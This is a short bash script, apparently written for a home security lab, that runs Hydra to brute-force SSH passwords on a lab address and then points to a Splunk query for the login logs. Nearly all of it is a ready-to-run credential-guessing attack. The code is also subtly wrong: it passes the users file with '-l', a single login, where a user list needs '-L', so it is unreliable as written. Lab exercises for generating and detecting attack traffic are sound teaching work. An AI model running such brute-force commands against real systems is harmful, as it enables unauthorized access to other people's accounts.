#!/bin/bash
# run_hydra_attack.sh
# Purpose: Simulate SSH brute force attack using Hydra
# Run this on: Kali Linux (Attacker — 192.168.1.187)
#
# WARNING: For educational use only in isolated lab environment.
# Do NOT run against systems you do not own.

TARGET_IP="192.168.0.100"
USERS_FILE="users.txt"
PASSWORDS_FILE="passwords.txt"

echo "[*] Starting SSH brute force simulation against $TARGET_IP..."
echo "[*] Using userlist: $USERS_FILE"
echo "[*] Using passwordlist: $PASSWORDS_FILE"
echo ""

hydra -l "$USERS_FILE" -P "$PASSWORDS_FILE" ssh://"$TARGET_IP"

echo ""
echo "[*] Attack simulation complete."
echo "[*] Check Splunk for logs: index=main sourcetype=linux_secure"
